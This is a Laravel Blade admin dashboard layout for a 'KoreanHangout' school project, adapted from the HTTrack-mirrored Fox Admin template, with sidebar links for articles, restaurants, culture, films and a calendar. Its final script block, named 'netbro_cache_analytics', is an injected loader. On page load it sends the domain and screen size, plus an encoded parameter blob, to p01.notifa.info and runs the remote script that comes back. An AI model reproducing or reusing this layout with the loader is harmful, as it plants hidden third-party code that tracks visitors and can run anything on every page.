<!DOCTYPE html>
<html lang="en">
  
<!-- Mirrored from fox-admin-templates.multipurposethemes.com/foxadmin-dark/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Jan 2020 02:15:27 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="csrf-token" content="{{ csrf_token() }}">


    <title>{{ Auth::user()->name }} || XII RPL 1</title>
    <!-- Favicon -->
    <link rel="icon" href="{{ asset('assets/frontend/img/core-img/k3.png')}}">
    
	<!-- Bootstrap 4.0-->
	<link rel="stylesheet" href="/assets/vendor_components/bootstrap/dist/css/bootstrap.css">
	
	<!-- Bootstrap 4.0-->
	<link rel="stylesheet" href="/assets/vendor_components/bootstrap/dist/css/bootstrap-extend.css">
	
	<!-- font awesome -->
	<link rel="stylesheet" href="/assets/vendor_components/font-awesome/css/font-awesome.css">
	
	<!-- ionicons -->
	<link rel="stylesheet" href="/assets/vendor_components/Ionicons/css/ionicons.css">
	
	<!-- theme style -->
	<link rel="stylesheet" href="/css/master_style.css">
	
	<!-- fox_admin skins. choose a skin from the css/skins folder instead of downloading all of them to reduce the load. -->
	<link rel="stylesheet" href="/css/skins/_all-skins.css">
	
	<!-- weather weather -->
	<link rel="stylesheet" href="/assets/vendor_components/weather-icons/weather-icons.css">
	
	<!-- jvectormap -->
	<link rel="stylesheet" href="/assets/vendor_components/jvectormap/jquery-jvectormap.css">
	
	<!-- date picker -->
	<link rel="stylesheet" href="/assets/vendor_components/bootstrap-datepicker/dist/css/bootstrap-datepicker.css">
	
	<!-- daterange picker -->
	<link rel="stylesheet" href="/assets/vendor_components/bootstrap-daterangepicker/daterangepicker.css">
	
	<!-- bootstrap wysihtml5 - text editor -->
    <link rel="stylesheet" href="/assets/vendor_plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.css">
    @yield('css')
	

	<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
	<!--[if lt IE 9]>
	<script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
	<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
	<![endif]-->

	<!-- google font -->
	<link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700" rel="stylesheet">

     
  </head>

<body class="hold-transition skin-blue sidebar-mini">
<div class="wrapper">

  <header class="main-header">
    <!-- Logo -->
    <a href="index-2.html" class="logo">
      <!-- mini logo for sidebar mini 50x50 pixels -->
      <span class="logo-mini"><b>A</b></span>
      <!-- logo for regular state and mobile devices -->
      <span class="logo-lg"><b>Korean</b>Hangout</span>
    </a>
    <!-- Header Navbar: style can be found in header.less -->
    <nav class="navbar navbar-static-top">
      <!-- Sidebar toggle button-->
      <a href="#" class="sidebar-toggle" data-toggle="push-menu" role="button">
        <span class="sr-only">Toggle navigation</span>
      </a>

      <div class="navbar-custom-menu">
        <ul class="nav navbar-nav">		  
          <!-- Tasks: style can be found in dropdown.less -->
          <!-- User Account: style can be found in dropdown.less -->
          <li class="dropdown user user-menu">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown">
              <img src="{{ asset('../assets/frontend/img/core-img/person.jpg')}}" class="user-image rounded-circle" alt="User Image">
            </a>
            <ul class="dropdown-menu scale-up">
              <!-- User image -->
              <li class="user-header">
                <img src="{{ asset('../assets/frontend/img/core-img/person.jpg')}}" class="rounded float-left" alt="User Image">
				
                <p>
                  {{ Auth::user()->name }}
                  <small>{{ Auth::user()->created_at->format('d M Y') }}</small>
                </p>
              </li>
              <!-- Menu Footer-->
              <li class="user-footer">
                <div class="pull-left">
                  <a href="#" class="btn btn-block btn-primary">Profile</a>
                </div>
                <div class="pull-right">
                  <a class="btn btn-block btn-danger" href="{{ route('logout') }}"
                                       onclick="event.preventDefault();
                                                     document.getElementById('logout-form').submit();">
                                        {{ __('Logout') }}
                                    </a>
                                    <form id="logout-form" action="{{ route('logout') }}" method="POST" style="display: none;">
                                        @csrf
                                    </form>
                </div> 
              </li>
            </ul>
          </li>
        </ul>
      </div>
    </nav>
  </header>
  <!-- Control Sidebar Toggle Button -->
  	<div>
		<button class="control-sidebar-btn btn btn-dark" data-toggle="control-sidebar"><i class="fa fa-cog fa-spin"></i></button>
	</div>
  <!-- Left side column. contains the logo and sidebar -->
  <aside class="main-sidebar">
    <!-- sidebar: style can be found in sidebar.less -->
    <section class="sidebar">
      <!-- Sidebar user panel -->
      <div class="user-panel">
        <div class="image float-left">
          <img src="{{ asset('../assets/frontend/img/core-img/person.jpg')}}" class="rounded" alt="User Image">
        </div>
        <div class="info float-left">
          <p>{{ Auth::user()->name }}</p>
          <a href="#"><i class="fa fa-circle text-success"></i> Online</a>
        </div>
		  <!-- search form -->
      <form action="#" method="get" class="sidebar-form">
        <div class="input-group">
        </div>
      </form>
      <!-- /.search form -->
      </div>
      
      <!-- sidebar menu: : style can be found in sidebar.less -->
      <ul class="sidebar-menu" data-widget="tree">        
        <li class="header">Data Table</li>
        <li>
          <a href="{{ route('home') }}">
            <i class="fa fa-home"></i> <span>Homes</span>
          </a>
        </li>

        <li>
          <a href="{{ route('artikel.index') }}">
            <i class="fa fa-angle-double-right"></i>
            <span>Artikel</span>
          </a>
        </li>

        <li>
          <a href="{{ route('restoran.index') }}">
            <i class="fa fa-angle-double-right"></i>
            <span>Restoran</span>
          </a>
        </li>

        <li>
          <a href="{{ route('budaya.index') }}">
            <i class="fa fa-angle-double-right"></i>
            <span>Budaya</span>
          </a>
        </li>
        
        <li>
          <a href="{{ url('admin/kategori') }}">
            <i class="fa fa-angle-double-right"></i>
            <span>Kategori</span>
          </a>
        </li>

        <li>
          <a href="{{ url('admin/tag') }}">
            <i class="fa fa-angle-double-right"></i>
            <span>Tag</span>
          </a>
        </li>

        <li>
          <a href="{{ url('admin/film') }}">
            <i class="fa fa-angle-double-right"></i>
            <span>Film</span>
          </a>
        </li>
        <li>
          <a href="{{ route('calendar') }}">
            <i class="fa fa-calendar"></i> <span>Calendar</span>
          </a>
        </li>
      </ul>
    </section>
  </aside>

  <!-- Content Wrapper. Contains page content -->
  <div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <section class="content-header">
      <h1>
        Dashboard
        <small>Control panel</small>
      </h1>
      <ol class="breadcrumb">
        <li class="breadcrumb-item"><a href="#"><i class="fa fa-dashboard"></i> Home</a></li>
        <li class="breadcrumb-item active">Dashboard</li>
      </ol>
    </section>
    <section class="content">
    @yield('content')
    </section>
  </div>
  <!-- /.content-wrapper -->
  <footer class="main-footer">
    <div class="pull-right d-none d-sm-inline-block">
      <b>Version</b> 1.1
    </div>Copyright &copy; 2017 <a href="https://www.multipurposethemes.com/">Multi-Purpose Themes</a>. All Rights Reserved.
  </footer>

  <!-- Control Sidebar -->
  <aside class="control-sidebar control-sidebar-dark">
    <div class="rpanel-title"> Service Panel <span class="btn pull-right"><i class="ion ion-close" data-toggle="control-sidebar"></i></span> </div>
    <!-- Create the tabs -->
    <ul class="nav nav-tabs nav-justified control-sidebar-tabs">
      <li class="nav-item"><a href="#control-sidebar-home-tab" data-toggle="tab"><i class="fa fa-home"></i></a></li>
      <li class="nav-item"><a href="#control-sidebar-settings-tab" data-toggle="tab"><i class="fa fa-cog fa-spin"></i></a></li>
    </ul>
    <!-- Tab panes -->
    <div class="tab-content">
      <!-- Home tab content -->
      <div class="tab-pane" id="control-sidebar-home-tab">
        <h3 class="control-sidebar-heading">Recent Activity</h3>
        <ul class="control-sidebar-menu">
          <li>
            <a href="javascript:void(0)">
              <i class="menu-icon fa fa-birthday-cake bg-red"></i>

              <div class="menu-info">
                <h4 class="control-sidebar-subheading">Admin Birthday</h4>

                <p>Will be July 24th</p>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <i class="menu-icon fa fa-user bg-yellow"></i>

              <div class="menu-info">
                <h4 class="control-sidebar-subheading">Jhone Updated His Profile</h4>

                <p>New Email : jhone_doe@demo.com</p>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <i class="menu-icon fa fa-envelope-o bg-light-blue"></i>

              <div class="menu-info">
                <h4 class="control-sidebar-subheading">Disha Joined Mailing List</h4>

                <p>disha@demo.com</p>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <i class="menu-icon fa fa-file-code-o bg-green"></i>

              <div class="menu-info">
                <h4 class="control-sidebar-subheading">Code Change</h4>

                <p>Execution time 15 Days</p>
              </div>
            </a>
          </li>
        </ul>
        <!-- /.control-sidebar-menu -->

        <h3 class="control-sidebar-heading">Tasks Progress</h3>
        <ul class="control-sidebar-menu">
          <li>
            <a href="javascript:void(0)">
              <h4 class="control-sidebar-subheading">
                Web Design
                <span class="label label-danger pull-right">40%</span>
              </h4>

              <div class="progress progress-xxs">
                <div class="progress-bar progress-bar-danger" style="width: 40%"></div>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <h4 class="control-sidebar-subheading">
                Update Data
                <span class="label label-success pull-right">75%</span>
              </h4>

              <div class="progress progress-xxs">
                <div class="progress-bar progress-bar-success" style="width: 75%"></div>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <h4 class="control-sidebar-subheading">
                Order Process
                <span class="label label-warning pull-right">89%</span>
              </h4>

              <div class="progress progress-xxs">
                <div class="progress-bar progress-bar-warning" style="width: 89%"></div>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <h4 class="control-sidebar-subheading">
                Development 
                <span class="label label-primary pull-right">72%</span>
              </h4>

              <div class="progress progress-xxs">
                <div class="progress-bar progress-bar-primary" style="width: 72%"></div>
              </div>
            </a>
          </li>
        </ul>
        <!-- /.control-sidebar-menu -->

      </div>
      <!-- /.tab-pane -->
      <!-- Stats tab content -->
      <div class="tab-pane" id="control-sidebar-stats-tab">Stats Tab Content</div>
      <!-- /.tab-pane -->
      <!-- Settings tab content -->
      <div class="tab-pane" id="control-sidebar-settings-tab">
        <form method="post">
          <h3 class="control-sidebar-heading">General Settings</h3>

          <div class="form-group">
            <input type="checkbox" id="report_panel" class="chk-col-grey" >
			<label for="report_panel" class="control-sidebar-subheading ">Report panel usage</label>

            <p>
              general settings information
            </p>
          </div>
          <!-- /.form-group -->

          <div class="form-group">
            <input type="checkbox" id="allow_mail" class="chk-col-grey" >
			<label for="allow_mail" class="control-sidebar-subheading ">Mail redirect</label>

            <p>
              Other sets of options are available
            </p>
          </div>
          <!-- /.form-group -->

          <div class="form-group">
            <input type="checkbox" id="expose_author" class="chk-col-grey" >
			<label for="expose_author" class="control-sidebar-subheading ">Expose author name</label>

            <p>
              Allow the user to show his name in blog posts
            </p>
          </div>
          <!-- /.form-group -->

          <h3 class="control-sidebar-heading">Chat Settings</h3>

          <div class="form-group">
            <input type="checkbox" id="show_me_online" class="chk-col-grey" >
			<label for="show_me_online" class="control-sidebar-subheading ">Show me as online</label>
          </div>
          <!-- /.form-group -->

          <div class="form-group">
            <input type="checkbox" id="off_notifications" class="chk-col-grey" >
			<label for="off_notifications" class="control-sidebar-subheading ">Turn off notifications</label>
          </div>
          <!-- /.form-group -->

          <div class="form-group">
            <label class="control-sidebar-subheading">              
              <a href="javascript:void(0)" class="text-red margin-r-5"><i class="fa fa-trash-o"></i></a>
              Delete chat history
            </label>
          </div>
          <!-- /.form-group -->
        </form>
      </div>
      <!-- /.tab-pane -->
    </div>
  </aside>
  <!-- /.control-sidebar -->
  
  <!-- Add the sidebar's background. This div must be placed immediately after the control sidebar -->
  <div class="control-sidebar-bg"></div>
  
</div>
<!-- ./wrapper -->
  	
	 
	  
	<!-- jQuery 3 -->
	<script src="/assets/vendor_components/jquery/dist/jquery.js"></script>
	
	<!-- jQuery UI 1.11.4 -->
	<script src="/assets/vendor_components/jquery-ui/jquery-ui.js"></script>
	
	<!-- Resolve conflict in jQuery UI tooltip with Bootstrap tooltip -->
	<script>
	  $.widget.bridge('uibutton', $.ui.button);
	</script>
	
	<!-- popper -->
	<script src="/assets/vendor_components/popper/dist/popper.min.js"></script>
	
	<!-- Bootstrap 4.0-->
	<script src="/assets/vendor_components/bootstrap/dist/js/bootstrap.js"></script>	
	
	<!-- ChartJS -->
	<script src="/assets/vendor_components/chart-js/chart.js"></script>
	
	<!-- Sparkline -->
	<script src="/assets/vendor_components/jquery-sparkline/dist/jquery.sparkline.js"></script>
	
	<!-- jvectormap -->
	<script src="/assets/vendor_plugins/jvectormap/jquery-jvectormap-1.2.2.min.js"></script>	
	<script src="/assets/vendor_plugins/jvectormap/jquery-jvectormap-world-mill-en.js"></script>
	
	<!-- jQuery Knob Chart -->
	<script src="/assets/vendor_components/jquery-knob/js/jquery.knob.js"></script>
	
	<!-- daterangepicker -->
	<script src="/assets/vendor_components/moment/min/moment.min.js"></script>
	<script src="/assets/vendor_components/bootstrap-daterangepicker/daterangepicker.js"></script>
	
	<!-- datepicker -->
	<script src="/assets/vendor_components/bootstrap-datepicker/dist/js/bootstrap-datepicker.js"></script>
	
	<!-- Bootstrap WYSIHTML5 -->
	<script src="/assets/vendor_plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.all.js"></script>
	
	<!-- Slimscroll -->
	<script src="/assets/vendor_components/jquery-slimscroll/jquery.slimscroll.js"></script>
	
	<!-- FastClick -->
	<script src="/assets/vendor_components/fastclick/lib/fastclick.js"></script>
	
	<!-- fox_admin App -->
	<script src="/js/template.js"></script>
	
	<!-- fox_admin dashboard demo (This is only for demo purposes) -->
	<script src="/js/pages/dashboard.js"></script>
	
	<!-- fox_admin for demo purposes -->
	<script src="/js/demo.js"></script>
	
	<!-- weather for demo purposes -->
    <script src="/assets/vendor_plugins/weather-icons/WeatherIcon.js"></script>
    @yield('js')
	
	<script type="text/javascript">
	
		WeatherIcon.add('icon1'	, WeatherIcon.SLEET , {stroke:false , shadow:false , animated:true } );
		WeatherIcon.add('icon2'	, WeatherIcon.SNOW , {stroke:false , shadow:false , animated:true } );
		WeatherIcon.add('icon3'	, WeatherIcon.LIGHTRAINTHUNDER , {stroke:false , shadow:false , animated:true } );

	</script>

	
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXjkQFel19XwnlDm12v7%2bgDUfpJ5y3I%2fxAv4sRRAGog%2fHViOmZBU7WxFdFd5nlqfia8Ih6LyiA1TmXGGz3AKqMAtWjit9CtyWwuNn%2b%2bbNkP70smEL9xVAaEibWWW4T2k9RadF%2b8JBCRTudoyOalw%2fAjuvB5zAEv7xHTaecyFJzTFqcFe0YO94Njws2ABoFAhNW5lDt37p%2bQ4lUWN6OSlWFdtosY68H%2bw1L564fNtJ5%2bT3aKEhVyNIRh6%2fINqxlHrH1dNKdrJTefIFjmrNROwh6ehEybskzPpeU8lE2T4uO%2fE0zYHqCuV4UMWhTgFqNCR1YoUIX21BcqjvBzFqJiP0YE4AV4ckMAfM8qyVDcchVQsMRMtUWXEIzqEat1rx46pqWRf5QJMta%2bKCM%2bIqbrxvdAhEbmfHKK5RxcopkUnaLGu0WHPwOczVUHhf5mx0K%2fzm6cjh3srYjWKKMQdXbejgN94Rsb5K%2fo5v8%2fx2J%2bVMweTRJGOzIsvZJG%2fj5cpXEQYy5" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from fox-admin-templates.multipurposethemes.com/foxadmin-dark/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Jan 2020 02:20:32 GMT -->
</html>
